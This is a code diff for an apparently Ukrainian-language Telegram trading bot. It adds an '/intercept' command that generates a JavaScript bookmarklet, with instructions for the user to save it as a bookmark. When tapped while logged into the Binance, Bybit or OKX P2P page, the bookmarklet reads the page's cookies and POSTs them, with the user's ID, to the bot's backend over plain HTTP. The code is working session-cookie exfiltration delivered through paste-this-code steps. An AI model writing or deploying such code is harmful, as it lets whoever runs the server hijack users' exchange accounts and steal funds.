@@ -3559,6 +3559,63 @@ async def process_tm_amount(message: Message, state: FSMContext) -> None:
         owner_user_id=message.from_user.id
     ))
 
+# =========================================================================
+# 📱 РУЧНЕ ПЕРЕХОПЛЕННЯ СЕСІЙ (Bookmarklet)
+# =========================================================================
+
+@router.callback_query(F.data.startswith("intercept:"))
+async def on_intercept_session(call: CallbackQuery, state: FSMContext) -> None:
+    exchange = call.data.split(":")[1]
+    user_id = call.from_user.id
+    
+    # Визначаємо хост. Поки бекенд без домену, використовуємо ngrok або локалку.
+    domain = "http://192.168.1.100:8000" # TODO: replace with config domain or env bot IP
+    try:
+        from core.utils.config import runtime_config
+        domain = runtime_config.get("api_domain", domain)
+    except:
+        pass
+    
+    js_code = f"""javascript:(function(){{
+    let c = document.cookie;
+    fetch('{domain}/api/v1/session/receive', {{
+        method: 'POST',
+        headers: {{'Content-Type': 'application/json'}},
+        body: JSON.stringify({{
+            exchange: '{exchange}',
+            user_id: {user_id},
+            cookies_str: c
+        }})
+    }}).then(r => alert('Сесія {exchange} успішно передана боту!'))
+      .catch(e => alert('Помилка: ' + e));
+}})();"""
+    
+    # Видаляємо зайві пробіли (Bookmarklet має бути 1 рядком)
+    js_code_inline = "".join(line.strip() for line in js_code.splitlines())
+
+    text = (
+        f"📱 <b>Оновлення сесії {exchange} (через телефон/ПК)</b>\n\n"
+        f"1️⃣ <b>Скопіюй код нижче</b> (натисни на нього).\n"
+        f"2️⃣ Створи в браузері (Safari/Chrome) нову закладку.\n"
+        f"3️⃣ Зміни URL-адресу цієї закладки на скопійований код.\n"
+        f"4️⃣ Зайди на сторінку P2P {exchange} та переконайся, що увійшов в акаунт.\n"
+        f"5️⃣ Тікни на щойно створену закладку у вибраному.\n\n"
+        f"🖥 <i>Код скрипта (натисни щоб скопіювати):</i>\n\n"
+        f"<code>{js_code_inline}</code>"
+    )
+    
+    await call.message.answer(text)
+    await call.answer()
+
+@router.message(Command("intercept"))
+async def cmd_intercept(message: Message) -> None:
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🟡 Binance", callback_data="intercept:Binance")],
+        [InlineKeyboardButton(text="⚫ Bybit", callback_data="intercept:Bybit")],
+        [InlineKeyboardButton(text="⚪ OKX", callback_data="intercept:OKX")]
+    ])
+    await message.answer("📲 Вибери біржу для якої згенерувати скрипт-закладку (Bookmarklet):", reply_markup=kb)
+
 @router.callback_query(F.data.startswith("trade:mt:"))
 async def on_trade_mt(call: CallbackQuery, state: FSMContext) -> None:
     if not _trade_worker:
